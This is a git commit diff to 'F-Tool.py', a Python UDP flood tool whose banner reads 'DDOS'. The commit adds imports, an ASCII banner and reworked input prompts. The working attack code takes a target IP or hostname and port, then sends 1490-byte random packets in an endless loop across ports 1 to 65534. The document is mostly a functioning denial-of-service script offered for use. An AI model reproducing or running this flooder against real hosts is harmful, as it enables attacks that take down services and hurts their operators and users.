4fde86b8e34adc7013d1fff973768045aebb8188
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-22 21:22:10 +0300

    Update F-Tool.py

--- F-Tool.py
+++ F-Tool.py
@@ -75,6 +75,19 @@ time.sleep(2.5)
 print("\033[94m")
 #########################################################################
 
+from socket import socket,AF_INET , SOCK_DGRAM,SOCK_STREAM,gaierror
+from random import _urandom
+from os import system
+from sys import exit
+
+#########Terminal colors################
+red = "\033[1;31m"
+blue = "\033[1;34m"
+green = "\033[1;32m"
+yellow = "\033[1;33m"
+white = "\033[1;37m"
+default = "\033[0m"
+
 def check_net_con():
   try:
     sock = socket(AF_INET,SOCK_STREAM)
@@ -87,7 +100,24 @@ def check_net_con():
 def banner():
   global red,blue,green,yellow,white,default
   system("clear" or "cls")
-  ####### we will send requests #######
+  print(f"""{blue}
+   ______   ______   _______  _______  \n
+  (  __  \ (  __  \ (  ___  )(  ____ \ \n
+  | (  \  )| (  \  )| (   ) || (    \/ \n
+  | |   ) || |   ) || |   | || (_____  \n 
+  | |   | || |   | || |   | |(_____  ) \n
+  | |   ) || |   ) || |   | |      ) | \n
+  | (__/  )| (__/  )| (___) |/\____) | \n
+  (______/ (______/ (_______)\_______) \n
+{default}
+  """)
+  print(50 * f"{green}_{default}")
+  print("\n")
+  print(f"\t\t{green}Created By {red}ELProfessor67{default}\n")
+  print(50 * f"{green}_{default}")
+  print("\n\n")
+  
+####### we will send requests #######
 def req_send(ip,port,byte):
   sock = socket(AF_INET,SOCK_DGRAM)
   send = 0
@@ -95,7 +125,7 @@ def req_send(ip,port,byte):
     sock.sendto(byte, (ip,port))
     send += 1
     port += 1
-    print (f"{green}Sent{red} {send}{green} packet {blue} {ip}{green} port: {yellow}{port}{default}")
+    print (f"{green}Sent{red} {send}{green} packet to{blue} {ip}{green} throught port: {yellow}{port}{default}")
     if port == 65534:
       port = 1
 
@@ -103,20 +133,21 @@ if __name__ == "__main__":
   banner()
   check_net_con()
 ############ we will take input#####
-try:
-    ip = input("\033[94m╔═══\033[91m[ Target IP ] •\n\033[94m╠══>\033[0m ")
-    port = int(input("\033[94m╠═══\033[91m[ Enter PORT ] •\n\033[94m╠══>\033[0m "))
+  try:
+    ip = input(f"{green} Enter Target IP or Hostname : {default}")
+    port = int(input(f"{green} Enter Port Number : {default}"))
+    
     if not (ip == "" or port == ""):
       byte = _urandom(1490)
       req_send(ip,port,byte)
     else:
       print(f"{red}IP address and Port number is required {default}")
       exit()
-	
-except ValueError:
+      
+  except ValueError:
     print(f"{red}Port number must be int not a str{default}")
     exit()
-except Exception as err:
+  except Exception as err:
     print(f"{red}{err}{default}")
     exit()
 #print('Atacando porta 💥')
